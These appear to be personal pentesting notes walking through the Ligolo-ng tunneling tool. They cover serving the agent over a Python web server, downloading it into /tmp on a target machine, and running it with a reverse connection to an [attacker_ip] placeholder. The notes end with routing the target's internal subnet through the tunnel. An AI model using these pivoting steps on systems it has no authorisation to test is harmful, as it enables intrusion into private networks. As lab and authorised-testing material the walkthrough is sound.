## Introduction

**Ligolo-ng** is a _simple_, _lightweight_ and _fast_ tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a **tun interface** (without the need of SOCKS).

## Features

- **Tun interface** (No more SOCKS/Proxychains!)
- Simple UI with _agent_ selection and _network information_
- Easy to use and setup
- Automatic certificate configuration with Let's Encrypt
- Performant (Multiplexing)
- Does not require privileges on the _agent_
- Socket listening/binding on the _agent_
- Multiple platforms supported for the _agent_
- Can handle multiple tunnels
- Reverse/Bind Connection
- Automatic tunnel/listeners recovery (in case of network issues)
- Websocket support

Website: [Ligolo-ng][https://github.com/nicocha30/ligolo-ng]


1 - go to releases
2 - create a new directory in you machine
3 - we will need an agent and also a proxy from the ligolo releases page. (download to the created folder)
4 - unzip the files

```
tar -xf 'file'
```

5 - we can then remove the zip files
6 - follow ligolo [setup][https://docs.ligolo.ng/Quickstart/]
7 - Start the Ligolo-ng proxy server 

```
./proxy -selfcert # Use self-signed certificates
```

8 - create anoter terminal tab and in the created folder start a webserver

```
python3 -m http.server 80
```

9 - go to the /tmp folder in the target machine and download the agent from the created folder
10 - we need to make the agent executable

```
chmod +x agent
```

11 - We now follow the steps from ligolo to **Start the agent**

```
./agent -connect [attacker_ip]:11601 -ignore-cert
```

12 - if we return to the ligolo tab we now see that we have an entry
13 - we now do session

```
session
```

14 - enter the entry, in this case 1
15 - we can now do `ifconfig` to see the network connections we have access to.
16 - we can now check the webserver we want to access from our iac network and we will add a route following the ligolo **Setup routing** instructions

```
sudo ip route add xxx.xxx.xxx.0/24 dev ligolo
```

17 - with this we can start a tunnel on the proxy (in the ligolo tab)

```
start
```